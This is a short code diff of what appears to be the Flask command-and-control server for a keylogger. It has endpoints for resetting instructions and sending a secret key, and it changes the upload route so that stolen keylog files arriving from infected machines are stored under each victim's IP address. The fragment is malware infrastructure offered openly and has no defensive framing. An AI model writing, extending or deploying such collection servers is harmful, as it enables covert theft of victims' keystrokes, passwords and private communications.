@@ -40,13 +40,13 @@ if __name__ == '__main__':
         print("\nInstruction reseted!\n")
         return "Instruction reseted!"
 
-    @app.route('/upload_file', methods=['POST'])
-    def upload_file():
+    @app.route('/upload_file/<victim_ip>', methods=['POST'])
+    def upload_file(victim_ip):
         if 'file' not in request.files:
             return 'No file provided in the request'
         file = request.files['file']
         # Save the uploaded file to the server's folder
-        file.save(f'./keylog_{int(time())}.txt')
+        file.save(f'./keylog_{victim_ip}_{int(time())}.txt')
         return 'File uploaded successfully'
 
     @app.route('/send_secret_key')
